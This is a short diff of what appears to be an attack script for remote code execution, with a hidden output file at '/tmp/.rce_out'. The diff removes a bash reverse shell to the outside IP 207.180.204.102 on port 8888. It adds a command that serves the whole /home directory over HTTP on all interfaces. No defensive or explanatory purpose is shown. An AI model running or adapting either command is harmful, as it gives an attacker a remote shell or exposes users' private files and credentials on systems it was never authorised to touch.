@@ -1,6 +1,6 @@
 import subprocess, os, urllib.request
 
-CMD = 'bash -i >& /dev/tcp/207.180.204.102/8888 0>&1'
+CMD = 'python -m http.server 8888 --bind 0.0.0.0 --directory /home'
 CALLBACK = ''
 OUTFILE = '/tmp/.rce_out'
 
